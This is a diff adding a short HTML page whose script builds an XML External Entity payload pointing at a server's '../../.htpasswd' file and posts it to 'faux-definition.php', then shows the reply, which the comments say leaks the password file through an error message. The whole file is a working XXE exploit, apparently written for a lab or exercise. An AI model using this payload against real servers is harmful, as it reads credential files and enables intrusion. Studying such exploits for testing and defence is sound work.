@@ -1,0 +1,29 @@
+<html>
+	<body>
+		
+		<! -- This script sends a POST request containing an XML External Entity to reveal the server's .htpasswd file -->
+		<script>
+		function subdata() {
+			
+			// Create the XXE and build XML string
+			var xxe = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"../../.htpasswd\" >]>"
+			var xml = "<?xml version='1.0' encoding='UTF-8'?>"+xxe+"<root><thing>&xxe;</thing></root>"
+			
+			/* Send request and display server's response. The server responds with an error
+			That gives away the password file's contents */
+			var req = new XMLHttpRequest();
+			console.log("Sending server: "+xml);
+			req.open("POST", "faux-definition.php", true);
+			req.setRequestHeader("Content-Type", "text/xml");
+			req.addEventListener("load", function() {
+				response = document.createTextNode("Server sent back: "+req.responseText);
+				document.body.appendChild(response);
+				});
+			req.send(xml);
+			event.preventDefault();
+			}
+		subdata();
+		</script>
+		
+	</body>
+</html>
